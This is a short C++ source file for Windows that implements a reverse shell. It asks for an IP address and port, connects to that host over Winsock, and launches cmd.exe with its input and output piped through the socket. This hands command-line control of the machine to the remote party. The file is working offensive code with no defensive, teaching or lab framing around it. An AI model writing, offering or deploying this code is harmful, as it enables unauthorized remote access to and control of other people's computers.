#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main()
{
    // Declare variables
    SOCKET shell;
    sockaddr_in shell_addr;
    WSADATA wsa;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    int connection;
    char ip_addr[16], port_str[6], RecvServer[512];

    // Prompt user to enter IP address and port number
    printf("Enter IP address: ");
    scanf("%s", ip_addr);
    printf("Enter port number: ");
    scanf("%s", port_str);
    int port = atoi(port_str);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("(!) Failed to initialize Winsock: %d\n", WSAGetLastError());
        return 1;
    }

    // Create a TCP socket
    if ((shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL)) == INVALID_SOCKET)
    {
        printf("(!) Failed to create socket: %d\n", WSAGetLastError());
        return 1;
    }

    // Set up the sockaddr_in structure
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    // Connect to the remote server
    if ((connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL)) == SOCKET_ERROR)
    {
        printf("(!) Connection to the target server failed: %d\n", WSAGetLastError());
        return 1;
    }

    // Receive data from the server
    recv(shell, RecvServer, sizeof(RecvServer), 0);

    // Set up the STARTUPINFO structure
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell; //pipes stdin, stdout and stderr to socket

    // Spawn a new command prompt window
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL, &si, &pi))
    {
        printf("(!) Failed to create process: %d\n", GetLastError());
        return 1;
    }

    // Wait for the process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up the handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    // Clear the buffer
    memset(RecvServer, 0, sizeof(RecvServer));

    // Cleanup Winsock
    WSACleanup();

    return 0;
}
